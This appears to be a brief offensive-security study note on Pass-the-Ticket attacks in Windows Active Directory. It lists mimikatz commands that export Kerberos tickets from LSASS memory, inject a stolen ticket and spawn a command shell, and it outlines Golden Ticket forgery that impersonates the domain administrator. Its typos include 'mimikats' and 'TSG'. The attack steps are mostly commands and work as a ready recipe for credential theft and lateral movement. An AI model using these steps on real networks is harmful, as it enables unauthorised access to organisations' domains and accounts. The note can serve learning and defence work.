### Difference b/w Pass-The-Hash & Pass-The-Ticket
The kerberos TGT ticket issues have and expiration of 10hrs (can be changes).
In the case of Pass-The-Hash, there is no expiration.

#### Extraction of Tickets in the system
```bash
mimikats
kerberos::list
kerberos::list /export #export the tickets stored in LSASS
```

> LSASS (Local Security Authority Server Service) is a process in Microsoft Windows operating systems that is responsible for enforcing the security policy on the system. It verifies users logging on to a Windows computer or server, handles password changes, and creates access tokens.

<center><i>We can see a ticket is generated in the directory</i></center>

#### Passing tickets using mimikatz
```bash
mimikatz
kerberos::ptt ticket.kirbi
misc::cmd
```


## Application
> Golden Ticket is also good example of Pass The Ticket Attack
> Forged ticket and simultaniously pass the TGT to KDC service to get TSG and enable the attacker to connect to Domain Server
> In the command it impersonates as id 500 for admin